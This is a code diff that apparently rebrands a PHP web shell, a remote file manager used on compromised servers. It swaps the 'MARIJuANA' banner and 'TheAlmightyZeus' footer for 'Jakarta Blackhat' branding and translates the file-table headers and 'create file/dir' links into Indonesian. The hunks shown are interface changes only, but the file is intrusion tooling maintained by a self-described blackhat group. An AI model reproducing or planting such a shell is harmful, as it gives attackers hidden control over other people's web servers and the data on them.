@@ -65,7 +65,7 @@ for($i=0;$i<$___;$i++) {
                         <header>
                                 <div class="y x">
                                         <a class="ajx" href="<?php echo basename($_SERVER['PHP_SELF']);?>">
-                                                MARIJuANA
+                                                We're Jakarta Blackhat!
                                         </a>
                                 </div>
 
@@ -369,18 +369,18 @@ for($i=0;$i<$___;$i++) {
                                         echo '<table cellspacing="0" cellpadding="7" width="100%">
                                                 <thead>
                                                         <tr>
-                                                                <th width="44%">[ NAME ]</th>
-                                                                <th width="11%">[ SIZE ]</th>
-                                                                <th width="17%">[ PERM ]</th>
-                                                                <th width="17%">[ DATE ]</th>
-                                                                <th width="11%">[ ACT ]</th>
+                                                                <th width="44%">[ Nama ]</th>
+                                                                <th width="11%">[ Ukuran ]</th>
+                                                                <th width="17%">[ Perizinan ]</th>
+                                                                <th width="17%">[ Tanggal ]</th>
+                                                                <th width="11%">[ Aksi ]</th>
                                                         </tr>
                                                 </thead>
                                                 <tbody>
                                                         <tr>
                                                                 <td>
-                                                                        <a class="ajx" href="?d='.hex($d).'&n">+FILE</a>
-                                                                        <a class="ajx" href="?d='.hex($d).'&l">+DIR</a>
+                                                                        <a class="ajx" href="?d='.hex($d).'&n">Buat File</a>
+                                                                        <a class="ajx" href="?d='.hex($d).'&l">Buat Dir</a>
                                                                 </td>
                                                         </tr>
                                                 ';
@@ -487,7 +487,7 @@ for($i=0;$i<$___;$i++) {
 
                         </article>
                         <footer class="x">
-                                &copy;TheAlmightyZeus
+                                &copy;JakartBlackHat!
                         </footer>
                         <?php
                         if(isset($_GET["1"])) {
